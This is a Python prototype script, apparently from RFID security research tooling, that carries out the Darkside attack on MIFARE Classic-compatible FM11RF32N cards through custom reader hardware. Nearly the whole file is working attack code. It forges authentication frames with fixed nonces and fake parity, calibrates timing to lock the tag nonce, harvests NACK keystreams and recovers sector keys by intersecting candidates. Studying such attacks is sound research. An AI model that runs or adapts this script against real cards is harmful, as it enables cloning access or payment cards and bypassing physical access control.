#!/usr/bin/env python3
"""Darkside on hardware via the chip collector (memrw OP_DARKSIDE) + the recovery in darkside.py.
Proves the on-chip loop can lock a repeating tag nonce and collect the 8 NACK keystreams on the
real FM11RF32N batch, before the attack is folded into the nfcprobe app.

    darkside_hw.py HOST [block] [keyB]

Each OP_DARKSIDE call is one run (one locked nt + its ks[8], or a partial failure). The host runs
several, intersects the candidate key lists (darkside.nonce2key), and reports / checks the survivor.
"""
import sys
import time

import rawa
from mfc import pack
from rawa import with_crc
import darkside

NR_WIRE = 0xAABBCC00 & 0xFFFFFF1F   # fixed on-wire reader nonce (last 3 bits = nt_diff)
AR_WIRE = 0x11223344                # fixed on-wire reader response


def build(uid4, block, keyB):
    """(steps, acode, aframe, nrar_frames[8]) for a 4-byte-UID card, mirroring mfChkKeys."""
    bcc = uid4[0] ^ uid4[1] ^ uid4[2] ^ uid4[3]
    steps = [
        (1, 0x40, 0, with_crc(b"\x50\x00")),             # HLTA (no answer)
        (1, 0x07, 1, b"\x52"),                           # WUPA (7 bits)
        (1, 0x70, 1, b"\x93\x70" + uid4 + bytes([bcc])), # SELECT CL1 (HW adds CRC)
    ]
    cmd = bytes([0x61 if keyB else 0x60, block])
    aframe, acode = pack(with_crc(cmd))
    nrar = []
    for c in range(8):
        nr = (NR_WIRE & 0xFFFFFF1F) | (c << 5)
        data = nr.to_bytes(4, "big") + AR_WIRE.to_bytes(4, "big")
        fifo, _ = pack(data, par=[0] * 8)                # fake (all-zero) parity
        nrar.append(fifo)
    return steps, acode, aframe, nrar


def main():
    host = sys.argv[1]
    block = int(sys.argv[2]) if len(sys.argv) > 2 else 0
    keyB = len(sys.argv) > 3 and sys.argv[3] in ("1", "b", "B")

    s = rawa.RawA(host)
    if not s.start():
        print("could not activate a card")
        return
    uid = bytes(s.uid)
    print(f"uid {uid.hex().upper()}, attacking block {block} key {'B' if keyB else 'A'}")
    if len(uid) != 4:
        print("only 4-byte UIDs handled in this prototype")
        return
    steps, acode, aframe, nrar = build(uid, block, keyB)
    uidi = int.from_bytes(uid, "big")

    # Calibrate ticks-per-nonce-step: fire two AUTHs a known PROBE ticks apart, measure the distance.
    PROBE = 6000
    tps = None
    for _ in range(8):
        nt0, nt1, _, _ = s.mon.darkside(steps, acode, aframe, nrar, PROBE, maxiter=3)
        d = darkside.dist_nt(nt0, nt1)
        if d:
            tps = PROBE / abs(d)
            print(f"  calib: d {d} over {PROBE} ticks -> {tps:.3f} ticks/step")
            break
    if not tps:
        print("could not calibrate")
        return

    # Refine the integer grid spacing so the per-fire nonce advance is small (one PRNG period is
    # 65535 steps; the advance at a fixed spacing is deterministic, so this is a closed loop).
    sync = round(65535 * tps)
    for _ in range(16):
        nt0, nt1, _, _ = s.mon.darkside(steps, acode, aframe, nrar, sync, maxiter=3)
        a = darkside.dist_nt(nt0, nt1)
        print(f"  refine: sync {sync} advance {a}")
        if a is None:
            continue
        if abs(a) <= 3:
            break
        sync -= round(a * tps)

    # Integer sync leaves a small systematic drift; measure its mean and cancel it with a fractional
    # per-fire tick correction so the nonce hovers over just a few values.
    tps_eff = sync / 65535
    adv = [darkside.dist_nt(*s.mon.darkside(steps, acode, aframe, nrar, sync, maxiter=3)[:2])
           for _ in range(6)]
    adv = [a for a in adv if a is not None]
    mean_a = sum(adv) / len(adv) if adv else 0
    sfracq = max(-32000, min(32000, round(-mean_a * tps_eff * 256)))
    print(f"  drift: mean advance {mean_a:.2f} steps -> sfracq {sfracq}")

    common = None
    runs = 0
    t0 = time.time()
    for attempt in range(10):
        nt0, nt1, ks, mask = s.mon.darkside(steps, acode, aframe, nrar, sync, sfracq=sfracq,
                                            maxiter=30)
        d01 = darkside.dist_nt(nt0, nt1)
        if mask != 0xFF:
            print(f"  run: nt0 {nt0:08X} nt1 {nt1:08X} d {d01} mask {mask:02X}")
            continue
        runs += 1
        ks_info = sum(ks[c] << ((7 - c) * 8) for c in range(8))
        cand = set(darkside.nonce2key(uidi, nt0, NR_WIRE, AR_WIRE, 0, ks_info))
        common = cand if common is None else (common & cand)
        print(f"  run {runs}: nt {nt0:08X}, {len(cand)} cands, intersection {len(common)}  "
              f"({time.time() - t0:.1f}s)")
        if len(common) <= 1:
            break

    if common:
        for k in sorted(common):
            print(f"candidate key: {k:012X}")
    else:
        print("no candidates")


if __name__ == "__main__":
    main()
